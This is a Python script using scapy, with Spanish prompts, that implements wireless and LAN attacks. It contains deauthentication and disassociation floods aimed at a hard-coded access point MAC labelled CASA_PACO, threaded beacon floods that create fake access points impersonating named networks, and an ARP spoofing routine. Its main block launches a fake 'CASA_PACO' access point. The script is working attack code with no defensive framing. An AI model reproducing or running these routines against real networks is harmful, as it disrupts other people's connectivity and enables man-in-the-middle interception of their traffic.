from threading import Thread
import scapy.all as scapy
import subprocess
import random

IFACE_NAME = "wlan0"
BROADCAST = "ff:ff:ff:ff:ff:ff:ff:ff"
CASAPACO = "a8:02:db:02:e1:84"
#SSIDNAMES = ["iPhone de Daniel", "MIWIFI_4421", "CASA_PACO", "Free Erasmus", "URSS", "MiFibra-4672", "jagger", "vodafoneAU7923"]
SSIDNAMES = ["CASA_PACO", "CASA_PACO", "CASA_PACO", "MOVISTAR_3A73", "MiFibra-98FC"]
AP_LIST = []

def sniff_eta(p):
    if p.haslayer(scapy.Dot11Beacon):
        bssid = p[scapy.Dot11].addr2
        ssid = p[scapy.Dot11Elt].info.decode()
        if bssid not in [x[1] for x in AP_LIST[0:]]:
            stats = p[scapy.Dot11Beacon].network_stats()
            channel = stats.get('channel')
            AP_LIST.append([ssid, bssid, channel])
            print('Nuevo punto de acceso: SSID = {}, BSSID = {}, Canal = {}'.format(ssid, bssid, channel))

def get_my_local_ip():
    output = subprocess.check_output(["hostname", "-I"])
    tmp = str(output).split()

    return tmp[0][2:]

def deauth(victim, bssid):

    print("DEAUTH ", victim, "from ", bssid)
    deauth_p = scapy.Dot11(type = 0, subtype = 12, addr1 = victim, addr2 = bssid, addr3 = bssid)
    p = scapy.RadioTap()/deauth_p/scapy.Dot11Deauth(reason = 7)

    scapy.sendp(p, inter = 0.5, count = 100, iface = IFACE_NAME, verbose = 1)
    p.show()

def disasoc(victim, bssid):

    print("DISASSOC ", victim, "from ", bssid)
    disasoc_p = scapy.Dot11(type = 0, subtype = 10, addr1 = victim, addr2 = bssid, addr3 = bssid)
    p = scapy.RadioTap()/disasoc_p/scapy.Dot11Disas(reason = 0)

    scapy.sendp(p, inter = 0.5, count = 100, iface = IFACE_NAME, verbose = 1)
    p.show()

def beacon(ssid, victim, mac):
    d11 = scapy.Dot11(type = 0, subtype = 8, addr1 = victim, addr2 = mac, addr3 = mac)
    if random.randint(0, 1) == 0:
        beacon = scapy.Dot11Beacon()
    else:
        beacon = scapy.Dot11Beacon(cap = "ESS+privacy")
    essid = scapy.Dot11Elt(ID = 'SSID', info = ssid, len = len(ssid))

    p = scapy.RadioTap() / d11 / beacon / essid

    scapy.sendp(p, inter = 0.1, iface = IFACE_NAME, loop = 1, verbose = 0)

def fake_aps():

    while True:
        val = int(input("Elige un numero de puntos de acceso a crear (min 1, max 5)\n\n-> "))
        if val > 0 and val < 6:
            break

    print("\nCreando %s punto/s de acceso falso/s...\n" % (val))
    #random.shuffle(SSIDNAMES)
    ssid_macs = [(SSIDNAMES[i], scapy.RandMAC()) for i in range(val)]

    for ssid, mac in ssid_macs:
        print("Creando AP %s" % (ssid))
        Thread(target = beacon, args = (ssid, BROADCAST, mac)).start()

def fake_ap(ssid):
    mac = scapy.RandMAC()
    beacon(ssid , BROADCAST, mac)

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst=BROADCAST)

    arp_rq_broad = broadcast / arp_request
    answer = scapy.srp(arp_rq_broad, timeout = 0.1, verbose = False)

    return answer[0][0][1].hwsrc

def spoof(v_ip, sp_ip):
    hwdst = get_mac(v_ip)
    p = scapy.ARP(op = 2, pdst = v_ip, hwdst = hwdst, psrc = sp_ip)

    scapy.send(p, verbose = 1)

if __name__ == '__main__':
    #deauth(BROADCAST, CASAPACO)
    #disasoc(BROADCAST, CASAPACO)
    #fake_aps()
    fake_ap("CASA_PACO")
    pass